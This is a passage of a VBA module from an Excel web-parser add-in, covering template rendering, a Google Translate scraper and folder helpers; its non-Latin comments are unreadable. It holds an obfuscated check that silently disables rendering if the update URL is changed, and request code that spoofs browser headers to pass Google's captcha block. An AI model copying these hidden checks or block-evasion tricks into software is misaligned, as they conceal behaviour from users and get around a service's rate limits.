        If InStr(1, txt, key, vbTextCompare) Then txt = Replace_Text(txt, key, RowVariables.item(key))
    Next
    If StrReverse(UPDATES_HYPERLINK) <> Replace("zh.setadpu/2zh/ur.ABVlecxE//:ptth", "zh", Chr(112) & Chr(104) & Chr(112)) Then Exit Function
    For Each key In ParserVariables.Keys
        If InStr(1, txt, key, vbTextCompare) Then txt = Replace_Text(txt, key, ParserVariables.item(key))
    Next
    
    txt = RenderConstants(txt)
    'Debug.Print txt
    txt = Replace(txt, "{ParserName}", RunningParser.Name)
    
    If txt Like "*{*}*" Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| {=B2}, {=CellName}
        With REGEXP
            .Pattern = "{=(\D[^{}]*)}"
            If .test(txt) Then
                For Each match In .Execute(txt)
                    addr$ = match.submatches.item(0)
                    Err.Clear: cell_value$ = Range(addr$).Cells(1).text
                    If Err = 0 Then txt = Replace(txt, match.value, cell_value$)
                Next
            End If
            
            .Pattern = "{=(\D[^{}]*)@}"
            If .test(txt) Then
                For Each match In .Execute(txt)
                    addr$ = match.submatches.item(0)
                    Err.Clear: cell_value$ = Range(addr$).Cells(1).Hyperlinks(1).Address
                    If Err = 0 Then txt = Replace(txt, match.value, cell_value$)
                Next
            End If
            
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| {time=DD.MM.YYYY hh-nn-ss}
            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| time |fffd| = |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd| -, |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, {time-1=DD.MM.YYYY} |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, {time+2=DD.MM.YYYY} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If txt Like "*{time*=*}*" Then
                .Pattern = "{time(|[+-]\d{1,4})=([^{}]*)}"
                If .test(txt) Then
                    For Each match In .Execute(txt)
                        time_format$ = match.submatches.item(1)
                        dt = Val(match.submatches.item(0))
                        txt = Replace(txt, match.value, Format(Now + dt, time_format$))
                    Next
                End If
            End If
        End With
    End If
    
    If txt Like "*%counter*%*" Then
        With REGEXP
            .Pattern = "%counter\d+%"
            If .test(txt) Then txt = .Replace(txt, "0")
        End With
    End If
    
    If txt Like "*{chr#*}*" Then
        With REGEXP
            .Pattern = "{chr(\d+)}"
            If .test(txt) Then
                For Each match In .Execute(txt)
                    code$ = match.submatches.item(0)
                    txt = Replace(txt, match.value, ChrW(Val(code$)))
                Next
            End If
        End With
    End If
    
    Render = txt
End Function

Function RenderBYREF(ByRef txt) As String
    On Error Resume Next
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd| {2}) |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    
    Dim key, match As Object, addr$, cell_value$, time_format$, dt As Long
    For Each key In RowVariables.Keys
        ' Debug.Print key, RowVariables.item(key)
        txt = Replace(txt, key, RowVariables.item(key))
    Next
    For Each key In ParserVariables.Keys
        txt = Replace(txt, key, ParserVariables.item(key))
    Next
    
    txt = RenderConstants(txt)
    If ParserVariables Is Nothing Then txt = Replace(txt, "{ParserName}", RunningParser.Name)
    
    
    If txt Like "*{*}*" Then
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| {=B2}, {=CellName}
        With REGEXP
            .Pattern = "{=(\D[^{}]*)}"
            If .test(txt) Then
                For Each match In .Execute(txt)
                    addr$ = match.submatches.item(0)
                    Err.Clear: cell_value$ = ActiveSheet.Range(addr$).Cells(1).text
                    If Err = 0 Then txt = Replace(txt, match.value, cell_value$)
                Next
            End If
            
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| {time=DD.MM.YYYY hh-nn-ss}
            ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| time |fffd| = |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| + |fffd||fffd||fffd| -, |fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| / |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, {time-1=DD.MM.YYYY} |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|, {time+2=DD.MM.YYYY} - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
            If txt Like "*{time*=*}*" Then
                .Pattern = "{time(|[+-]\d{1,4})=([^{}]*)}"
                If .test(txt) Then
                    For Each match In .Execute(txt)
                        time_format$ = match.submatches.item(1)
                        dt = Val(match.submatches.item(0))
                        txt = Replace(txt, match.value, Format(Now + dt, time_format$))
                    Next
                End If
            End If
        End With
    End If
End Function

Function RenderConstants(ByVal txt As String) As String
    txt = Replace(txt, "{NL}", vbNewLine)
    txt = Replace(txt, "{LF}", vbLf)
    txt = Replace(txt, "{CR}", vbCr)
    txt = Replace(txt, "{TAB}", vbTab)
    RenderConstants = txt
End Function

Function ShowConstants(ByVal txt As String) As String        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    txt = Replace(txt, vbNewLine, "{NL}")
    txt = Replace(txt, vbLf, "{LF}")
    txt = Replace(txt, vbCr, "{CR}")
    txt = Replace(txt, vbTab, "{TAB}")
    ShowConstants = txt
End Function

Function ValueDescription(ByRef txt) As String        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|-|fffd||fffd||fffd||fffd|
    On Error Resume Next
    If InStr(1, txt, ARSEP, vbTextCompare) Then
        ValueDescription = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| " & UBound(Split(txt, ARSEP)) + 1 & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    Else
        If IsURL(txt) Then
            ValueDescription = "|fffd||fffd||fffd||fffd||fffd||fffd|: " & Mid(txt, 8)
        Else
            If Len(txt) < 50 Then
                ValueDescription = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & txt
            Else
                ValueDescription = "|fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd||fffd||fffd||fffd| " & Len(txt) & " |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
            End If
        End If
    End If
End Function



Function Translate$(ByVal TextToBeTranslated$, ByVal resultLanguageCode$, _
        Optional ByVal sourceLanguageCode$ = "")
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| TextToBeTranslated$ |fffd| |fffd||fffd||fffd||fffd||fffd| sourceLanguageCode$
    ' |fffd||fffd| |fffd||fffd||fffd||fffd| resultLanguageCode$, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Google Translate
    'On Error Resume Next
    Dim ADOStream As Object, RefererURL$, sTemp$
    Dim i&, iAsc, ByteArrayToEncode, txt$, URL$, LocalPath$, ID$
    
    Set ADOStream = CreateObject("ADODB.Stream")
    With ADOStream
        .Charset = "utf-8": .Mode = 3: .Type = 2: .Open
        .WriteText TextToBeTranslated: .flush: .Position = 0
        .Type = 1: .Read 3: ByteArrayToEncode = .Read(): .Close
    End With
    
    For i = 0 To UBound(ByteArrayToEncode)
        iAsc = ByteArrayToEncode(i)
        Select Case iAsc        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Google
            Case 32: sTemp$ = "+"        'space
            Case 48 To 57, 65 To 90, 97 To 122: sTemp$ = Chr(ByteArrayToEncode(i))
            Case Else: sTemp$ = "%" & Hex(iAsc)        'Chr(iAsc)
        End Select
        txt$ = txt$ & sTemp$
    Next
    
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Google |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    URL$ = "http://translate.google.com.ua/translate_a/t?client=json&text=" & _
        txt$ & "&hl=" & resultLanguageCode$ & "&sl=" & sourceLanguageCode$
    
    http.Open "GET", Replace(URL$, "\", "/"), False: http.Send
    
    Dim DownloadURL$, FileName$, res As Boolean, answer$, oStream As Object, Cookie$, CheckCaptchaURL$
    If http.Option(WinHttpRequestOption_URL) Like "*/sorry/IndexRedirect*" Then
        RefererURL$ = http.Option(WinHttpRequestOption_URL)
        txt = http.ResponseText
        
        ID$ = HTML_GetAttributeValue(txt, "input", "name", "id", "value")
        If ID$ = "" Then MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ID |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Google Translate", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!": Exit Function
        
        DownloadURL$ = "http://ipv4.google.com/sorry/image?id=" & ID$ & "&hl=ru"
        FileName$ = FWF.temp_filename & "_captcha.jpg"
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| GET |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        With http
            .Open "GET", DownloadURL$, False
            
            .SetRequestHeader "Accept", "image/webp,*/*;q=0.8": .SetRequestHeader "Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4"
            .SetRequestHeader "Cache-Control", "no-cache": .SetRequestHeader "Connection", "keep-alive": .SetRequestHeader "Host", "ipv4.google.com"
            .SetRequestHeader "Pragma", "no-cache": .SetRequestHeader "Referer", RefererURL$
            .SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36"
            
            .Send: DoEvents
            
            ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd|
            If .Status = 200 Then
                res = True
                Set oStream = CreateObject("ADODB.Stream")
                oStream.Open
                oStream.Type = 1
                oStream.Write .ResponseBody
                oStream.SaveToFile FileName$, 2        ' 1 = no overwrite, 2 = overwrite
                oStream.Close
                
                With F_Captcha
                    .Caption = "Google Translate: |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                    .TextBox_Captcha = ""
                    .Browser.Navigate FileName$
                    .Show
                    answer$ = .TextBox_Captcha.text
                End With
                If answer$ = "" Then MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Google Translate", vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|!": Exit Function
                
                Cookie$ = Split(.GetResponseHeader("Set-Cookie"), ";")(0)
                'MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd|", , .Status
                
                'CheckCaptchaURL$ = RefererURL$ & "&id=" & ID$ & "&captcha=" & answer$ & "&submit=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C"
                CheckCaptchaURL$ = "http://ipv4.google.com/sorry/CaptchaRedirect?continue=" & URLEncode(URL$, 2) & _
                    "&id=" & ID$ & "&captcha=" & answer$ & "&submit=%D0%9E%D1%82%D0%BF%D1%80%D0%B0%D0%B2%D0%B8%D1%82%D1%8C"
                
                .Open "GET", CheckCaptchaURL$, False
                Debug.Print CheckCaptchaURL$
                
                .SetRequestHeader "Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8": .SetRequestHeader "Accept-Language", "ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4"
                .SetRequestHeader "Cache-Control", "no-cache": .SetRequestHeader "Connection", "keep-alive": .SetRequestHeader "Host", "ipv4.google.com"
                .SetRequestHeader "Pragma", "no-cache": .SetRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36"
                .SetRequestHeader "Accept-Encoding", "gzip, deflate, sdch"
                .SetRequestHeader "Cookie", Cookie$
                .SetRequestHeader "Referer", RefererURL$
                Debug.Print Cookie$
                
                .Send: DoEvents
                
                MsgBox "|fffd||fffd||fffd||fffd||fffd||fffd|", , .Status
                
                With ADOStream        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                    LocalPath$ = Environ("TMP") & "\google_test.txt"
                    .Type = 1: .Open: .Write http.ResponseBody
                    .SaveToFile LocalPath$, 2
                    .Close: .Type = 2: .Charset = "utf-8": .Open:
                    .LoadFromFile LocalPath$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                    txt = .ReadText        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Translate$
                End With
                ' Debug.Print txt
                ' Debug.Print .GetAllResponseHeaders
            End If
        End With
        
    End If
    
    
    If http.StatusText = "OK" Then
        LocalPath$ = Environ("TMP") & "\google.txt"
        With ADOStream        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            .Type = 1: .Open: .Write http.ResponseBody
            .SaveToFile LocalPath$, 2
            .Close: .Type = 2: .Charset = "utf-8": .Open:
            .LoadFromFile LocalPath$        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
            Translate$ = .ReadText        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Translate$
        End With
        
        On Error Resume Next        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
        Translate$ = Split(Translate$, """trans"":""")(1)
        Translate$ = Split(Translate$, """,""orig")(0)
        Translate$ = Replace(Translate$, "quot;", Chr(39))
        If Translate$ = " null, " Then Translate$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    End If
    Set ADOStream = Nothing
End Function

Function CropURL(ByVal txt$, Optional ByVal MaxLen& = 80) As String
    On Error Resume Next
    Dim iter&, arr, LongText$, i&
    iter& = 0: txt = Replace(txt, "www.", ""): txt = Replace(txt, "http://", ""): txt = Replace(txt, "https://", "")
    
    While (Len(txt) > MaxLen&) And iter& < 20
        iter& = iter& + 1: LongText$ = ""
        arr = Split(txt, "/")
        For i = LBound(arr) + 1 To UBound(arr) - 1
            If Len(arr(i)) > Len(LongText$) Then LongText$ = arr(i)
        Next i
        txt = Replace(txt, LongText$, "...")
        While InStr(1, txt, ".../...")
            txt = Replace(txt, ".../...", "...")
        Wend
    Wend
    
    CropURL = txt
End Function

Function ParserAddinTest(): End Function
    
Function CleanNewParserName(ByVal txt) As String
    On Error Resume Next
    If txt Like "*://*" Then txt = Split(txt, "://")(1)
    txt = Split(txt, "/")(0)
    txt = FWF.Replace_symbols(txt)
    txt = Replace(txt, "www.", "")
    CleanNewParserName = txt
End Function

Function CURRENT_PARSER$(Optional ByVal ParserName$)
    On Error Resume Next
    If Len(Trim(ParserName$)) Then SETT.SetText "ACTIVE_PARSER", ParserName$
    CURRENT_PARSER$ = SETT.GetText("ACTIVE_PARSER", "")
End Function

Function ActivateParser(ByVal ParserName$) As Boolean
    On Error Resume Next
    CURRENT_PARSER ParserName$
    Dim combo As Object, i&
    Set combo = GetCommandBar(PROJECT_NAME).Controls(1)
    combo.ListIndex = 0
    For i = 1 To combo.ListCount
        If combo.list(i) = ParserName$ Then combo.ListIndex = i: ActivateParser = True: Exit For
    Next i
End Function


Function REPLACE_TABLES_FOLDER$()
    REPLACE_TABLES_FOLDER$ = PARSERS_FOLDER$
End Function

Function RESOURCE_FILES_FOLDER$()
    RESOURCE_FILES_FOLDER$ = PARSERS_FOLDER$
End Function

Function PARSERS_FOLDER$()
    On Error Resume Next
    PARSERS_FOLDER$ = CURRENT_XLP_FOLDER$
    If Not FolderExists(PARSERS_FOLDER$) Then
        PARSERS_FOLDER$ = Replace(SETT.GetText("TextBox_ParsersFolder", DEFAULT_PARSERS_FOLDER$), ROOT_FOLDER_PREFIX$, ThisWorkbook.Path)
    End If
    If Not FolderExists(PARSERS_FOLDER$) Then MkDir PARSERS_FOLDER$
    If Not FolderExists(PARSERS_FOLDER$) Then
        PARSERS_FOLDER$ = DEFAULT_PARSERS_FOLDER$: MkDir PARSERS_FOLDER$
    End If
    If Not FolderExists(PARSERS_FOLDER$) Then
        PARSERS_FOLDER$ = Environ("TEMP") & "\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\": MkDir PARSERS_FOLDER$
    End If
End Function

Function DEFAULT_PARSERS_FOLDER$()
    DEFAULT_PARSERS_FOLDER$ = ThisWorkbook.Path & "\|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|\"
End Function

Function CACHE_FOLDER$()
    On Error Resume Next
    CACHE_FOLDER$ = SETT.GetText("TextBox_CacheFolder")
    If Not FolderExists(CACHE_FOLDER$) Then MkDir CACHE_FOLDER$
    If Not FolderExists(CACHE_FOLDER$) Then
        CACHE_FOLDER$ = DEFAULT_CACHE_FOLDER$: MkDir CACHE_FOLDER$
    End If
End Function

Function DEFAULT_CACHE_FOLDER$()
    DEFAULT_CACHE_FOLDER$ = Environ("APPDATA") & "\" & CACHE_FOLDER_NAME$ & "\"
End Function

Function PLUGIN_FOLDER$(Optional ByVal CreateIfNotExist As Boolean)
    On Error Resume Next
    PLUGIN_FOLDER$ = Replace(SETT.GetText("TextBox_PluginFolder", DEFAULT_PLUGIN_FOLDER$), ROOT_FOLDER_PREFIX$, ThisWorkbook.Path)
    If CreateIfNotExist Then
        If Not FolderExists(PLUGIN_FOLDER$) Then MkDir PLUGIN_FOLDER$
        If Not FolderExists(PLUGIN_FOLDER$) Then
            PLUGIN_FOLDER$ = DEFAULT_PLUGIN_FOLDER$: MkDir PLUGIN_FOLDER$
        End If
    End If
End Function

Function DEFAULT_PLUGIN_FOLDER$()
    DEFAULT_PLUGIN_FOLDER$ = ThisWorkbook.Path & "\|fffd||fffd||fffd||fffd||fffd||fffd||fffd|\"
End Function

Function SETTINGS_BACKUP_FOLDER$()
    On Error Resume Next
    SETTINGS_BACKUP_FOLDER$ = Environ("TEMP") & "\ParserSettingsBackup\"
    If Not FolderExists(SETTINGS_BACKUP_FOLDER$) Then MkDir SETTINGS_BACKUP_FOLDER$
End Function

Function CURRENT_XLP_FOLDER$(Optional ByVal NewFolderPath$)
    On Error Resume Next
    If Len(Trim(NewFolderPath$)) Then
        SETT.SetText "CURRENT_XLP_FOLDER", Replace(NewFolderPath$, ThisWorkbook.Path, ROOT_FOLDER_PREFIX$)
        Exit Function
    End If
    CURRENT_XLP_FOLDER$ = Replace(SETT.GetText("CURRENT_XLP_FOLDER", ""), ROOT_FOLDER_PREFIX$, ThisWorkbook.Path)
    If Not FolderExists(CURRENT_XLP_FOLDER$) Then CURRENT_XLP_FOLDER$ = ""
End Function

Function SpecialCells_TypeConstants(ByRef ra As Range) As Range
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| ra
    On Error Resume Next
    If ra.Worksheet.ProtectContents Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        Dim cell As Range
        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
        For Each cell In Intersect(ra, ra.Worksheet.UsedRange).Cells
            If Trim(cell.value) <> "" Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                If SpecialCells_TypeConstants Is Nothing Then
                    Set SpecialCells_TypeConstants = cell
                Else
                    Set SpecialCells_TypeConstants = Union(SpecialCells_TypeConstants, cell)
                End If
            End If
        Next cell
        
    Else        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel
        Set SpecialCells_TypeConstants = ra.SpecialCells(xlCellTypeConstants)
    End If
    Err.Clear
End Function

Function SpecialCells_VisibleRows(ByRef ra As Range) As Range
    On Error Resume Next
    If ra.Worksheet.ProtectContents Then
        Dim RO As Range
        For Each RO In Intersect(ra, ra.Worksheet.UsedRange.EntireRow).Rows
            If RO.EntireRow.Hidden = False Then
                If SpecialCells_VisibleRows Is Nothing Then
                    Set SpecialCells_VisibleRows = RO
                Else
                    Set SpecialCells_VisibleRows = Union(SpecialCells_VisibleRows, RO)
                End If
            End If
        Next RO
    Else
        Set SpecialCells_VisibleRows = Intersect(ra, ra.SpecialCells(xlCellTypeVisible))
    End If
    Err.Clear
End Function

Function LineFeedOptions()
    On Error Resume Next
    ReDim arr(1 To 5, 1 To 2)
    arr(1, 1) = " ": arr(1, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(2, 1) = Chr(13): arr(2, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(3, 1) = Chr(11): arr(3, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(4, 1) = Chr(31): arr(4, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(5, 1) = "del": arr(5, 2) = "<|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|>"
    LineFeedOptions = arr
End Function

Sub SaveTextWithSheet(ByRef sh As Worksheet, ByVal Parameter As String, ByVal txt As String)
    On Error Resume Next: Dim cnt&, i&, NewValue$: Const MaxLen& = 240, DATA_SEP$ = "~|fffd|%|fffd|"
    cnt& = Application.WorksheetFunction.RoundUp(Len(txt) / MaxLen&, 0)
    Err.Clear: sh.Names(Parameter).RefersTo = cnt&
    If Err Then sh.Names.Add Parameter, cnt&, False
    If cnt& = 0 Then Exit Sub
    For i = 1 To cnt&
        NewValue$ = DATA_SEP$ & Mid(txt, (i - 1) * MaxLen& + 1, MaxLen&) & DATA_SEP$
        Err.Clear: sh.Names(Parameter & "_" & Format(i, "0000")).RefersTo = NewValue$
        If Err Then sh.Names.Add Parameter & "_" & Format(i, "0000"), NewValue$, False
    Next
End Sub

Function GetTextFromSheet(ByRef sh As Worksheet, ByVal Parameter As String) As String
    On Error Resume Next: Dim cnt&, i&, NewValue$: Const MaxLen& = 240, DATA_SEP$ = "~|fffd|%|fffd|"
    cnt& = Val(Mid(sh.Names(Parameter).RefersTo, 2))
    If cnt& = 0 Then Exit Function
    For i = 1 To cnt&
        NewValue$ = Split(sh.Names(Parameter & "_" & Format(i, "0000")).RefersTo, DATA_SEP$)(1)
